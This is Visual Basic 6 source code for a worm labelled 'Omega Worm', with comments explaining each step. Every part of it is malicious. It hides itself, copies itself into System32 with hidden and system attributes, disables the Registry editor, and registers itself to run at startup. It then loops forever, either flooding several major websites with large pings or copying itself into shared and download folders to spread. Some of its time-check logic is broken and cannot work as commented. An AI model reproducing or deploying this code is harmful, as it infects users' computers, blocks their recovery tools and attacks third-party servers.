Private Sub Form_Load()
' Omega Worm
On Error Resume Next ' continues when an error occurs

' hides the program
Me.Hide
App.TaskVisible = False

' copies itself to system32
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Windows\System32\" + App.EXEName + ".exe"

' hides itself by setting RASH but can still be viewed if the ShowSuperHiiden is set to 1
SetAttr "C:\Windows\System32\" + App.EXEName + ".exe", vbReadOnly + vbArchive + vbSystem + vbHidden

' Disables the Registry from user access but apps can still access it
Set x = CreateObject("wscript.shell")
regkey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\"
x.regwrite regkey & "DisableRegistryTools", 1, "REG_DWORD"

' Set ShowSuperHidden to 0
regkey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\"
x.regwrite regkey & "ShowSuperHidden", 0, "REG_DWORD"

' adds itself to the registry startup
regkey = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\"
x.regwrite regkey & "Windows", "C:\Windows\System32\" + App.EXEName + ".exe"


' checks the time then selects a case to determine the action to take
Do ' starts a loop
Select Case Time
Case Time > "7:01:00 PM" And Time < "5:59:00 PM"  ' if the time is between 7:01 pm and 5:59 pm it will ping aol,yahoo,google,microsoft 60 times then end
For t = 1 To 60
Shell ("ping -l 65500 www.microsoft.com")
Shell ("ping -l 65500 www.aol.com")
Shell ("ping -l 65500 www.yahoo.com")
Shell ("ping -l 65500 www.google.com")
Sleep 5000
Next t

Case Time > "6:00:00 PM" And Time < "7:00:00 PM"
On Error GoTo chk ' on error it will go to the chk label
FileSystem.ChDir "c:\Shared\" ' it will attempt to cd to a directory
chk:
If VBA.Err.Number = 76 Then ' if error 76 then it means the directory dose not exist
Else ' it means it does
FileCopy App.Path + "\" + App.EXEName + ".exe", "c:\Shared\" + App.EXEName + ".exe" ' copy itself to it
End If

On Error GoTo chk2 ' same steps as above
FileSystem.ChDir "c:\windows\Shared\"
chk2:
If VBA.Err.Number = 76 Then
Else
FileCopy App.Path + "\" + App.EXEName + ".exe", "c:\windows\Shared\" + App.EXEName + ".exe"
End If

On Error GoTo chk3
FileSystem.ChDir "C:\My Shared Folder\"
chk3:
If VBA.Err.Number = 76 Then
Else
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\My Shared Folder\" + App.EXEName + ".exe"
End If

On Error GoTo chk4
FileSystem.ChDir "C:\Windows\My Shared Folder\"
chk4:
If VBA.Err.Number = 76 Then
Else
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Windows\My Shared Folder\" + App.EXEName + ".exe"
End If

On Error GoTo chk5
FileSystem.ChDir "C:\Share\"
chk5:
If VBA.Err.Number = 76 Then
Else
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Share\" + App.EXEName + ".exe"
End If

On Error GoTo chk6
FileSystem.ChDir "C:\Windows\Share\"
chk6:
If VBA.Err.Number = 76 Then
Else
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Windows\Share\" + App.EXEName + ".exe"
End If

On Error GoTo chk7
FileSystem.ChDir "C:\My Downloads\"
chk7:
If VBA.Err.Number = 76 Then
Else
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\My Downloads\" + App.EXEName + ".exe"
End If

On Error GoTo chk8
FileSystem.ChDir "C:\Windows\My Downloads\"
chk8:
If VBA.Err.Number = 76 Then
Else
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Windows\My Downloads\" + App.EXEName + ".exe"
End If
End Select
Loop
End Sub
